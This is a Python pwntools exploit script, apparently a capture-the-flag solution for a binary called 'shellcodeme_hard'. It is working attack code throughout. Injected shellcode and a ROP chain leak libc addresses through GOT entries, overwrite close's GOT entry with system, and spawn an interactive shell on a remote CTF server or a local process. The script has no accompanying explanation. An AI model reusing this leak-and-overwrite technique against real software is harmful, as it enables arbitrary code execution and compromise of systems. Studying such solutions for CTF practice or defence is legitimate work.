#!/usr/bin/env python2

from pwn import *

def exploit():
  # setup fgets
  payload = """
    pop rbp
    push 0x4008A9
    push 0x4008A9
    push 0x4008A9
    push 0x4008A9
    push 0x4008A9
    push 0x4008A9
    push 0x4008A9
    ret 0x40
  """
  p.sendlineafter("code?", asm(payload))

  rop = ROP(name)
  rop.puts(binary.got["close"])
  rop.puts(binary.got["fgets"])
  rop.read(0, binary.got["close"])
  rop.puts(binary.got["fgets"])
  rop.read(0, binary.bss(0x800))
  rop.close(binary.bss(0x800))

  pause()
  p.sendline(str(rop))

  p.recvline()
  close_leak = u64(p.recvline(keepends=False).ljust(8, "\x00"))
  fgets_leak = u64(p.recvline(keepends=False).ljust(8, "\x00"))

  libc.address = close_leak - libc.symbols["close"]
  log.info("close_leak: 0x{:x}".format(close_leak))
  log.info("fgets_leak: 0x{:x}".format(fgets_leak))

  log.info("libc.address: 0x{:x}".format(libc.address))

  p.send(p64(libc.symbols["system"]))
  p.recvline()
  p.send("/bin/sh\x00")
  p.interactive()


if __name__ == "__main__":
  name = "./shellcodeme_hard"
  binary = ELF(name)

  context.terminal=["tmux", "sp", "-h"]

  # context.log_level = 'debug'
  # context.timeout = 5
  context.arch = "amd64"

  if len(sys.argv) > 1:
    p = remote("shellcodeme.420blaze.in", 4200)
    libc = ELF("./libc6_2.19-0ubuntu6.14_amd64.so")
  else:
    # p = process(name, env={'LD_PRELOAD': libc_name})
    p = process(name, env={})
    libc = ELF("/lib/x86_64-linux-gnu/libc-2.23.so")
    gdb.attach(p, """
b system
    c
    """)

  exploit()
